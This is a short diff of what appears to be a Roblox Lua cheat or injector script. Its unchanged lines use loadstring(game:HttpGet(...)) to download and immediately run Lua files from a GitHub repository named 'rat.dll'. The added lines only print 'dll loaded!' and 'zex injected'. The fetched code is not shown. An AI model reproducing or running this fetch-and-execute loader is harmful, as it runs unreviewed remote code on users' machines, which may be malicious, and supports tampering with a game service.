@@ -8,6 +8,9 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ravyyxd/rat.dll/refs/
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ravyyxd/rat.dll/refs/heads/main/dll/other.lua", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ravyyxd/rat.dll/refs/heads/main/dll/setup.lua", true))()
 
+warn('dll loaded!')
+warn('zex injected')
+
 -- local Players = game:GetService("Players")
 -- local Lighting = game:GetService("Lighting")
 -- local LocalPlayer = Players.LocalPlayer
